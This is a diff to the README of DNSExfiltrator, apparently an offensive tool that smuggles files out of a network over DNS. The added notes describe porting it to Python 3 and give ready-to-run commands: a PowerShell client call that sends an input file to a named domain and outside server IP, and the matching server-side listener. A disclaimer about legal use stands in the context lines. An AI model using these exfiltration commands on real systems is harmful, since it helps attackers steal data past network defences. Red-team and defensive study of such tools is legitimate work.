@@ -104,3 +104,18 @@ This tool is intended to be used in a legal and legitimate way only:
 
 Quoting Empire's authors:
 *There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*
+
+
+### Side NOTES (My Observations )
+- CLient side scripts .js and .cs do no work on Linux
+- Easier to user Powershell Script for client on Windows Machine
+-Scripts in orginal are written for Python 2 . I have made changes to integrate into Python3 especially for Server Code.
+
+### Commands
+1. CLient Side 
+- powershell
+- Import-Module .\Invoke-DNSExfiltrator.ps1
+-  Invoke-DNSExfiltrator -i inputFile -d domainsearch.engineer -p password -s 20.12.12.184 -t 500
+
+2. Server Side 
+- python3 dnsexfiltrator.py -d domainsearch.engineer -p password
